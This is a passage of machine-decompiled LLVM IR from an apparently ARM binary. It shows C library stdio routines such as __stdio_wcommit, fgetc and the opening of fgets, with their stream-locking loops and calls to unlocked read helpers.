  store i32 %v8_16838, i32* %v7_16838, align 4
  %v0_1683c = load i32, i32* %r5.global-to-local, align 4
  %v1_1683c = add i32 %v0_1683c, 32
  %v2_1683c = inttoptr i32 %v1_1683c to i32*
  %v3_1683c = load i32, i32* %v2_1683c, align 4
  store i32 %v3_1683c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16840 = icmp eq i32 %v3_1683c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_16848 = add i32 %v3_1683c, 56
  store i32 %v1_16848, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_16840, label %dec_label_pc_16854, label %dec_label_pc_167b8

dec_label_pc_16854:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_16858 = load i32, i32* %r7.global-to-local, align 4
  %v2_16858 = add i32 %v0_16858, 76
  %v3_16858 = inttoptr i32 %v2_16858 to i32*
  %v4_16858 = load i32, i32* %v3_16858, align 4
  store i32 %v4_16858, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_16858 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1687814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1687814, label %dec_label_pc_16880, label %dec_label_pc_16864

dec_label_pc_16864:                               ; preds = %dec_label_pc_16854, %dec_label_pc_16878
  %v1_1686c = phi i32 [ %storemerge, %dec_label_pc_16878 ], [ %storemerge12, %dec_label_pc_16854 ]
  %v1_16864 = inttoptr i32 %v1_1686c to i16*
  %v2_16864 = load i16, i16* %v1_16864, align 2
  %v3_16864 = zext i16 %v2_16864 to i32
  store i32 %v3_16864, i32* %r3.global-to-local, align 4
  %v1_16868 = and i32 %v3_16864, 64
  %v2_16868 = icmp eq i32 %v1_16868, 0
  br i1 %v2_16868, label %dec_label_pc_16878, label %bb39

bb39:                                             ; preds = %dec_label_pc_16864
  store i32 %v1_1686c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16878

dec_label_pc_16878:                               ; preds = %dec_label_pc_16864, %bb39
  %v1_16870 = xor i1 %v2_16868, true
  call void @__pseudo_cond_branch(i1 %v1_16870, i32 ptrtoint (i32* @global_var_168a8.646 to i32))
  %v0_16874 = load i32, i32* %r4.global-to-local, align 4
  %v1_16874 = add i32 %v0_16874, 32
  %storemerge.in = inttoptr i32 %v1_16874 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16878 = icmp eq i32 %storemerge, 0
  br i1 %v2_16878, label %dec_label_pc_16880, label %dec_label_pc_16864

dec_label_pc_16880:                               ; preds = %dec_label_pc_16878, %dec_label_pc_16854
  %v2_16884 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_16884, i32* %r4.global-to-local, align 4
  %v1_16888 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16888

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1683c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_167dc, { 1, 0 }
  uselistorder i32 %v4_1679c, { 2, 1, 0 }
  uselistorder i32 %v4_1676c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_16878, { 1, 0 }
  uselistorder label %dec_label_pc_16864, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_167fc, { 1, 0 }
  uselistorder label %dec_label_pc_167d8, { 1, 0 }
  uselistorder label %dec_label_pc_167b8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_168a8 = load i32, i32* @r4, align 4
  store i32 %v3_168a8, i32* %stack_var_-8, align 4
  %v1_168ac = add i32 %arg1, 8
  %v2_168ac = inttoptr i32 %v1_168ac to i32*
  %v3_168ac = load i32, i32* %v2_168ac, align 4
  store i32 %v3_168ac, i32* @r1, align 4
  %v1_168b0 = add i32 %arg1, 16
  %v2_168b0 = inttoptr i32 %v1_168b0 to i32*
  %v3_168b0 = load i32, i32* %v2_168b0, align 4
  %v9_168b4 = icmp eq i32 %v3_168b0, %v3_168ac
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_168b4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_168ac, i32* %v2_168b0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_168c0 = xor i1 %v9_168b4, true
  call void @__pseudo_cond_branch(i1 %v1_168c0, i32 ptrtoint (i32* @global_var_18298.647 to i32))
  %v0_168c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_168c4 = add i32 %v0_168c4, 8
  %v2_168c4 = inttoptr i32 %v1_168c4 to i32*
  %v3_168c4 = load i32, i32* %v2_168c4, align 4
  %v1_168c8 = add i32 %v0_168c4, 16
  %v2_168c8 = inttoptr i32 %v1_168c8 to i32*
  %v3_168c8 = load i32, i32* %v2_168c8, align 4
  %v2_168cc = sub i32 %v3_168c8, %v3_168c4
  %v2_168d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_168d0, i32* @r4, align 4
  ret i32 %v2_168cc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_168d8 = load i32, i32* @r4, align 4
  store i32 %v3_168d8, i32* %stack_var_-20, align 4
  %v6_168d8 = load i32, i32* @r5, align 4
  %v9_168d8 = load i32, i32* @r6, align 4
  %v12_168d8 = load i32, i32* @r7, align 4
  %v15_168d8 = load i32, i32* @lr, align 4
  %v1_168dc = add i32 %arg1, 52
  %v2_168dc = inttoptr i32 %v1_168dc to i32*
  %v3_168dc = load i32, i32* %v2_168dc, align 4
  store i32 %v3_168dc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168e0 = icmp eq i32 %v3_168dc, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_168e0, label %dec_label_pc_16914, label %dec_label_pc_168f0

dec_label_pc_168f0:                               ; preds = %entry
  %v1_168f0 = add i32 %arg1, 16
  %v2_168f0 = inttoptr i32 %v1_168f0 to i32*
  %v3_168f0 = load i32, i32* %v2_168f0, align 4
  store i32 %v3_168f0, i32* %r2.global-to-local, align 4
  %v1_168f4 = add i32 %arg1, 24
  %v2_168f4 = inttoptr i32 %v1_168f4 to i32*
  %v3_168f4 = load i32, i32* %v2_168f4, align 4
  store i32 %v3_168f4, i32* %r3.global-to-local, align 4
  %v3_168f8 = icmp uge i32 %v3_168f0, %v3_168f4
  store i1 %v3_168f8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_168f8, label %dec_label_pc_16908, label %.thread

.thread:                                          ; preds = %dec_label_pc_168f0
  %v2_168fc = inttoptr i32 %v3_168f0 to i8*
  %v3_168fc = load i8, i8* %v2_168fc, align 1
  %v4_168fc = zext i8 %v3_168fc to i32
  store i32 %v4_168fc, i32* %r5.global-to-local, align 4
  %v6_168fc = add i32 %v3_168f0, 1
  store i32 %v6_168fc, i32* %r2.global-to-local, align 4
  store i32 %v6_168fc, i32* %v2_168f0, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16908:                               ; preds = %dec_label_pc_168f0
  %v1_16908 = inttoptr i32 %arg1 to i16*
  %v2_16908 = call i32 @getc_unlocked(i16* %v1_16908)
  store i32 %v2_16908, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16914:                               ; preds = %entry
  %v0_16914 = call i32 @__aeabi_read_tp()
  %v0_16918 = load i32, i32* @r7, align 4
  %v1_16918 = add i32 %v0_16918, 64
  %v2_16918 = inttoptr i32 %v1_16918 to i32*
  %v3_16918 = load i32, i32* %v2_16918, align 4
  store i32 %v3_16918, i32* %r3.global-to-local, align 4
  %v1_1691c = add i32 %v0_16914, -1168
  store i32 %v1_1691c, i32* @r6, align 4
  %v3_16920 = icmp uge i32 %v3_16918, %v1_1691c
  store i1 %v3_16920, i1* %cpsr_c.global-to-local, align 1
  %v9_16920 = icmp eq i32 %v3_16918, %v1_1691c
  br i1 %v9_16920, label %dec_label_pc_16968, label %dec_label_pc_16928

dec_label_pc_16928:                               ; preds = %dec_label_pc_16914
  %v1_16928 = add i32 %v0_16918, 56
  store i32 %v1_16928, i32* @r5, align 4
  store i32 %v1_16928, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %dec_label_pc_16940.dec_label_pc_16934_crit_edge, %dec_label_pc_16928
  %v0_16934 = phi i32 [ %v0_16934.pre, %dec_label_pc_16940.dec_label_pc_16934_crit_edge ], [ %v1_16928, %dec_label_pc_16928 ]
  %v1_16934 = inttoptr i32 %v0_16934 to i32*
  %v2_16934 = load i32, i32* %v1_16934, align 4
  store i32 %v2_16934, i32* %r3.global-to-local, align 4
  %v1_16938 = load i32, i32* @r4, align 4
  %v3_16938 = icmp uge i32 %v2_16934, %v1_16938
  store i1 %v3_16938, i1* %cpsr_c.global-to-local, align 1
  %v9_16938 = icmp eq i32 %v2_16934, %v1_16938
  br i1 %v9_16938, label %dec_label_pc_16940, label %dec_label_pc_16958

dec_label_pc_16940:                               ; preds = %dec_label_pc_16934
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16950 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16950, label %dec_label_pc_16954, label %dec_label_pc_16940.dec_label_pc_16934_crit_edge

dec_label_pc_16940.dec_label_pc_16934_crit_edge:  ; preds = %dec_label_pc_16940
  %v0_16934.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16934

dec_label_pc_16954:                               ; preds = %dec_label_pc_16940
  %v0_16954 = load i32, i32* @r4, align 4
  store i32 %v0_16954, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16958

dec_label_pc_16958:                               ; preds = %dec_label_pc_16934, %dec_label_pc_16954
  %v0_16958 = phi i32 [ %v0_16954, %dec_label_pc_16954 ], [ %v2_16934, %dec_label_pc_16934 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16958 = icmp eq i32 %v0_16958, 0
  br i1 %v2_16958, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_16958
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16958, %bb
  store i32 92516, i32* @lr, align 4
  %v1_16960 = xor i1 %v2_16958, true
  call void @__pseudo_cond_branch(i1 %v1_16960, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_16964 = load i32, i32* @r6, align 4
  %v1_16964 = load i32, i32* @r7, align 4
  %v2_16964 = add i32 %v1_16964, 64
  %v3_16964 = inttoptr i32 %v2_16964 to i32*
  store i32 %v0_16964, i32* %v3_16964, align 4
  %v0_16968.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16968

dec_label_pc_16968:                               ; preds = %dec_label_pc_16914, %bb18
  %v1_16978 = phi i32 [ %v0_16918, %dec_label_pc_16914 ], [ %v0_16968.pre, %bb18 ]
  %v1_16968 = add i32 %v1_16978, 60
  %v2_16968 = inttoptr i32 %v1_16968 to i32*
  %v3_16968 = load i32, i32* %v2_16968, align 4
  store i32 %v3_16968, i32* %r2.global-to-local, align 4
  %v1_1696c = add i32 %v1_16978, 16
  %v2_1696c = inttoptr i32 %v1_1696c to i32*
  %v3_1696c = load i32, i32* %v2_1696c, align 4
  store i32 %v3_1696c, i32* @r1, align 4
  %v1_16970 = add i32 %v1_16978, 24
  %v2_16970 = inttoptr i32 %v1_16970 to i32*
  %v3_16970 = load i32, i32* %v2_16970, align 4
  store i32 %v3_16970, i32* %r3.global-to-local, align 4
  %v1_16974 = add i32 %v3_16968, 1
  store i32 %v1_16974, i32* %r2.global-to-local, align 4
  store i32 %v1_16974, i32* %v2_16968, align 4
  %v0_1697c = load i32, i32* @r1, align 4
  %v1_1697c = load i32, i32* %r3.global-to-local, align 4
  %v3_1697c = icmp uge i32 %v0_1697c, %v1_1697c
  store i1 %v3_1697c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1697c, label %dec_label_pc_1698c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16968
  %v2_16980 = inttoptr i32 %v0_1697c to i8*
  %v3_16980 = load i8, i8* %v2_16980, align 1
  %v4_16980 = zext i8 %v3_16980 to i32
  store i32 %v4_16980, i32* %r5.global-to-local, align 4
  %v6_16980 = add i32 %v0_1697c, 1
  store i32 %v6_16980, i32* @r1, align 4
  %v2_16984 = load i32, i32* @r7, align 4
  %v3_16984 = add i32 %v2_16984, 16
  %v4_16984 = inttoptr i32 %v3_16984 to i32*
  store i32 %v6_16980, i32* %v4_16984, align 4
  br label %dec_label_pc_16998

dec_label_pc_1698c:                               ; preds = %dec_label_pc_16968
  %v0_1698c = load i32, i32* @r7, align 4
  %v1_16990 = inttoptr i32 %v0_1698c to i16*
  %v2_16990 = call i32 @getc_unlocked(i16* %v1_16990)
  store i32 %v2_16990, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16998

dec_label_pc_16998:                               ; preds = %.thread2, %dec_label_pc_1698c
  %v0_16998 = load i32, i32* @r7, align 4
  %v1_16998 = add i32 %v0_16998, 60
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  %v3_16998 = load i32, i32* %v2_16998, align 4
  %v1_1699c = add i32 %v3_16998, -1
  store i32 %v1_1699c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_169a0 = icmp eq i32 %v1_1699c, 0
  store i32 %v1_1699c, i32* %v2_16998, align 4
  br i1 %v2_169a0, label %dec_label_pc_169ac, label %dec_label_pc_16a0c

dec_label_pc_169ac:                               ; preds = %dec_label_pc_16998
  %v0_169ac = load i32, i32* %r3.global-to-local, align 4
  %v1_169ac = load i32, i32* @r7, align 4
  %v2_169ac = add i32 %v1_169ac, 64
  %v3_169ac = inttoptr i32 %v2_169ac to i32*
  store i32 %v0_169ac, i32* %v3_169ac, align 4
  %v0_169b0 = load i32, i32* @r7, align 4
  %v1_169b0 = add i32 %v0_169b0, 56
  store i32 %v1_169b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_169b4

dec_label_pc_169b4:                               ; preds = %dec_label_pc_169e4.dec_label_pc_169b4_crit_edge, %dec_label_pc_169ac
  %v0_169bc = phi i32 [ %v0_169bc.pre, %dec_label_pc_169e4.dec_label_pc_169b4_crit_edge ], [ %v1_169b0, %dec_label_pc_169ac ]
  %v0_169b4 = phi i32 [ %v0_169b4.pre, %dec_label_pc_169e4.dec_label_pc_169b4_crit_edge ], [ %v0_169b0, %dec_label_pc_169ac ]
  %v1_169b4 = add i32 %v0_169b4, 56
  %v2_169b4 = inttoptr i32 %v1_169b4 to i32*
  %v3_169b4 = load i32, i32* %v2_169b4, align 4
  store i32 %v3_169b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_169bc, i32* %r2.global-to-local, align 4
  %v1_169c022 = inttoptr i32 %v0_169bc to i32*
  %v2_169c023 = load i32, i32* %v1_169c022, align 4
  store i32 %v2_169c023, i32* %r3.global-to-local, align 4
  %v3_169c425 = icmp uge i32 %v2_169c023, %v3_169b4
  store i1 %v3_169c425, i1* %cpsr_c.global-to-local, align 1
  %v9_169c431 = icmp eq i32 %v2_169c023, %v3_169b4
  br i1 %v9_169c431, label %dec_label_pc_169cc, label %dec_label_pc_169e4

dec_label_pc_169cc:                               ; preds = %dec_label_pc_169b4, %dec_label_pc_169cc.dec_label_pc_169c0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_169dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_169dc, label %dec_label_pc_169e0, label %dec_label_pc_169cc.dec_label_pc_169c0_crit_edge

dec_label_pc_169cc.dec_label_pc_169c0_crit_edge:  ; preds = %dec_label_pc_169cc
  %v0_169c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_169c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_169c0 = inttoptr i32 %v0_169c0.pre to i32*
  %v2_169c0 = load i32, i32* %v1_169c0, align 4
  store i32 %v2_169c0, i32* %r3.global-to-local, align 4
  %v3_169c4 = icmp uge i32 %v2_169c0, %v1_169c4.pre
  store i1 %v3_169c4, i1* %cpsr_c.global-to-local, align 1
  %v9_169c4 = icmp eq i32 %v2_169c0, %v1_169c4.pre
  br i1 %v9_169c4, label %dec_label_pc_169cc, label %dec_label_pc_169e4

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169cc
  %v0_169e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_169e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169e4

dec_label_pc_169e4:                               ; preds = %dec_label_pc_169b4, %dec_label_pc_169cc.dec_label_pc_169c0_crit_edge, %dec_label_pc_169e0
  %v0_169ec = phi i32 [ %v0_169e0, %dec_label_pc_169e0 ], [ %v2_169c023, %dec_label_pc_169b4 ], [ %v2_169c0, %dec_label_pc_169cc.dec_label_pc_169c0_crit_edge ]
  %v1_169e4 = phi i32 [ %v0_169e0, %dec_label_pc_169e0 ], [ %v3_169b4, %dec_label_pc_169b4 ], [ %v1_169c4.pre, %dec_label_pc_169cc.dec_label_pc_169c0_crit_edge ]
  %v3_169e4 = icmp uge i32 %v0_169ec, %v1_169e4
  store i1 %v3_169e4, i1* %cpsr_c.global-to-local, align 1
  %v9_169e4 = icmp eq i32 %v0_169ec, %v1_169e4
  br i1 %v9_169e4, label %dec_label_pc_169ec, label %dec_label_pc_169e4.dec_label_pc_169b4_crit_edge

dec_label_pc_169e4.dec_label_pc_169b4_crit_edge:  ; preds = %dec_label_pc_169e4
  %v0_169b4.pre = load i32, i32* @r7, align 4
  %v0_169bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_169b4

dec_label_pc_169ec:                               ; preds = %dec_label_pc_169e4
  %v2_169ec = icmp ne i32 %v1_169e4, 0
  store i1 %v2_169ec, i1* %cpsr_c.global-to-local, align 1
  %v7_169f0 = icmp slt i32 %v1_169e4, 2
  br i1 %v7_169f0, label %dec_label_pc_16a0c, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169ec
  %v0_169f8 = load i32, i32* @r1, align 4
  %v1_169f8 = add i32 %v0_169f8, 129
  store i32 %v1_169f8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %.thread, %dec_label_pc_16998, %dec_label_pc_169f4, %dec_label_pc_169ec, %dec_label_pc_16908
  %v0_16a0c = load i32, i32* %r5.global-to-local, align 4
  %v2_16a14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a14, i32* @r4, align 4
  store i32 %v6_168d8, i32* @r5, align 4
  store i32 %v9_168d8, i32* @r6, align 4
  store i32 %v12_168d8, i32* @r7, align 4
  store i32 %v15_168d8, i32* @lr, align 4
  ret i32 %v0_16a0c

; uselistorder directives
  uselistorder i32 %v0_169e0, { 1, 0, 2 }
  uselistorder i32 %v1_169c4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1697c, { 1, 0, 2 }
  uselistorder i32 %v1_16978, { 0, 2, 1 }
  uselistorder i32 %v1_16938, { 1, 0 }
  uselistorder i32 %v3_168f0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_16a0c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_169e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_169cc, { 1, 0 }
  uselistorder label %dec_label_pc_16998, { 1, 0 }
  uselistorder label %dec_label_pc_16968, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_16958, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16a1c = load i32, i32* @r4, align 4
  store i32 %v3_16a1c, i32* %stack_var_-32, align 4
  %v6_16a1c = load i32, i32* @r5, align 4
  %v9_16a1c = load i32, i32* @r6, align 4
  %v12_16a1c = load i32, i32* @r7, align 4
  %v15_16a1c = load i32, i32* @r8, align 4
  %v24_16a1c = load i32, i32* @lr, align 4
  %v1_16a20 = add i32 %arg3, 52
  %v2_16a20 = inttoptr i32 %v1_16a20 to i32*
  %v3_16a20 = load i32, i32* %v2_16a20, align 4
  store i32 %v3_16a20, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a24 = icmp eq i32 %v3_16a20, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_16a24, label %dec_label_pc_16a38, label %dec_label_pc_16a9c

dec_label_pc_16a38:                               ; preds = %entry
  %v0_16a38 = call i32 @__aeabi_read_tp()
  %v1_16a3c = add i32 %arg3, 64
  %v2_16a3c = inttoptr i32 %v1_16a3c to i32*
  %v3_16a3c = load i32, i32* %v2_16a3c, align 4
  store i32 %v3_16a3c, i32* %r3.global-to-local, align 4
  %v1_16a40 = add i32 %v0_16a38, -1168
  store i32 %v1_16a40, i32* @r8, align 4
  %v3_16a44 = icmp uge i32 %v3_16a3c, %v1_16a40
  store i1 %v3_16a44, i1* %cpsr_c.global-to-local, align 1
  %v9_16a44 = icmp eq i32 %v3_16a3c, %v1_16a40
  br i1 %v9_16a44, label %dec_label_pc_16a90, label %dec_label_pc_16a4c

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_16a38
  %v1_16a4c = add i32 %arg3, 56
  store i32 %v1_16a4c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16a4c, i32* %r2.global-to-local, align 4
  %v0_16a58 = load i32, i32* @r6, align 4
  store i32 %v0_16a58, i32* @r4, align 4
  %v1_16a5c36 = inttoptr i32 %v1_16a4c to i32*
  %v2_16a5c37 = load i32, i32* %v1_16a5c36, align 4
  store i32 %v2_16a5c37, i32* %r3.global-to-local, align 4
  %v3_16a6039 = icmp uge i32 %v2_16a5c37, %v0_16a58
  store i1 %v3_16a6039, i1* %cpsr_c.global-to-local, align 1
  %v9_16a6045 = icmp eq i32 %v2_16a5c37, %v0_16a58
  br i1 %v9_16a6045, label %dec_label_pc_16a68, label %dec_label_pc_16a80

dec_label_pc_16a68:                               ; preds = %dec_label_pc_16a4c, %dec_label_pc_16a68.dec_label_pc_16a5c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16a78 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16a78, label %dec_label_pc_16a7c, label %dec_label_pc_16a68.dec_label_pc_16a5c_crit_edge

dec_label_pc_16a68.dec_label_pc_16a5c_crit_edge:  ; preds = %dec_label_pc_16a68
  %v0_16a5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16a60.pre = load i32, i32* @r4, align 4
  %v1_16a5c = inttoptr i32 %v0_16a5c.pre to i32*
  %v2_16a5c = load i32, i32* %v1_16a5c, align 4
  store i32 %v2_16a5c, i32* %r3.global-to-local, align 4
  %v3_16a60 = icmp uge i32 %v2_16a5c, %v1_16a60.pre
  store i1 %v3_16a60, i1* %cpsr_c.global-to-local, align 1
  %v9_16a60 = icmp eq i32 %v2_16a5c, %v1_16a60.pre
  br i1 %v9_16a60, label %dec_label_pc_16a68, label %dec_label_pc_16a80

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a68
  %v0_16a7c = load i32, i32* @r4, align 4
  store i32 %v0_16a7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a80

dec_label_pc_16a80:                               ; preds = %dec_label_pc_16a4c, %dec_label_pc_16a68.dec_label_pc_16a5c_crit_edge, %dec_label_pc_16a7c
  %v0_16a80 = phi i32 [ %v0_16a7c, %dec_label_pc_16a7c ], [ %v2_16a5c37, %dec_label_pc_16a4c ], [ %v2_16a5c, %dec_label_pc_16a68.dec_label_pc_16a5c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a80 = icmp eq i32 %v0_16a80, 0
  br i1 %v2_16a80, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_16a80
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16a80, %bb
  store i32 92812, i32* @lr, align 4
  %v1_16a88 = xor i1 %v2_16a80, true
  call void @__pseudo_cond_branch(i1 %v1_16a88, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_16a8c = load i32, i32* @r8, align 4
  %v1_16a8c = load i32, i32* @r7, align 4
  %v2_16a8c = add i32 %v1_16a8c, 64
  %v3_16a8c = inttoptr i32 %v2_16a8c to i32*
  store i32 %v0_16a8c, i32* %v3_16a8c, align 4
  br label %dec_label_pc_16a90

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a38, %bb20
  %v0_16a90 = load i32, i32* @r7, align 4
  %v1_16a90 = add i32 %v0_16a90, 60
  %v2_16a90 = inttoptr i32 %v1_16a90 to i32*
  %v3_16a90 = load i32, i32* %v2_16a90, align 4
  %v1_16a94 = add i32 %v3_16a90, 1
  store i32 %v1_16a94, i32* %r3.global-to-local, align 4
  store i32 %v1_16a94, i32* %v2_16a90, align 4
  %v0_16a9c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_16aa0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16aa4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %entry, %dec_label_pc_16a90
  %v0_16aa4 = phi i32 [ %arg3, %entry ], [ %v0_16aa4.pre, %dec_label_pc_16a90 ]
  %v0_16aa0 = phi i32 [ %arg2, %entry ], [ %v0_16aa0.pre, %dec_label_pc_16a90 ]
  %v0_16a9c = phi i32 [ %arg1, %entry ], [ %v0_16a9c.pre, %dec_label_pc_16a90 ]
  store i32 %v0_16aa0, i32* %r1.global-to-local, align 4
  store i32 %v0_16aa4, i32* %r2.global-to-local, align 4
  %v3_16aa8 = inttoptr i32 %v0_16a9c to i8*
  %v4_16aa8 = call i32 @__GI_fgets_unlocked(i8* %v3_16aa8, i32 %v0_16aa0, i32 %v0_16aa4)
  %v0_16aac = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16aac = icmp eq i32 %v0_16aac, 0
  store i32 %v4_16aa8, i32* %r8.global-to-local, align 4
  br i1 %v2_16aac, label %dec_label_pc_16ab8, label %dec_label_pc_16b2c

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16a9c
  %v0_16ab8 = load i32, i32* @r7, align 4
  %v1_16ab8 = add i32 %v0_16ab8, 60
  %v2_16ab8 = inttoptr i32 %v1_16ab8 to i32*
  %v3_16ab8 = load i32, i32* %v2_16ab8, align 4
  %v1_16abc = add i32 %v3_16ab8, -1
  store i32 %v1_16abc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ac0 = icmp eq i32 %v1_16abc, 0
  store i32 %v1_16abc, i32* %v2_16ab8, align 4
  br i1 %v2_16ac0, label %dec_label_pc_16acc, label %dec_label_pc_16b2c

